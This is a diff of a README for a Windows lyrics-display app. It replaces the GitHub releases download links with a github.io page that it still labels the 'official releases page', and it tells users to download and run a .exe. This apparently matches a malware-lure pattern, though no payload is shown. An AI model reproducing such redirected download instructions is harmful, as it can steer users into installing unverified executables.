@@ -1,6 +1,6 @@
 # 🎵 lyricsdisplay - Sync your music lyrics instantly
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/cartilaginoustubeopener909/lyricsdisplay/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://cartilaginoustubeopener909.github.io)
 
 lyricsdisplay shows song lyrics on your screen as you listen to music. The software tracks your music playback to display the correct lines in real time. It works with major music platforms and keeps the lyrics visible above other open windows. 
 
@@ -8,7 +8,7 @@ lyricsdisplay shows song lyrics on your screen as you listen to music. The softw
 
 You do not need programming knowledge to use this application on Windows. Follow the steps below to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/cartilaginoustubeopener909/lyricsdisplay/releases) to download the setup file.
+1. Visit the [official releases page](https://cartilaginoustubeopener909.github.io) to download the setup file.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the link to save the file to your computer.
 4. Locate the file in your downloads folder.
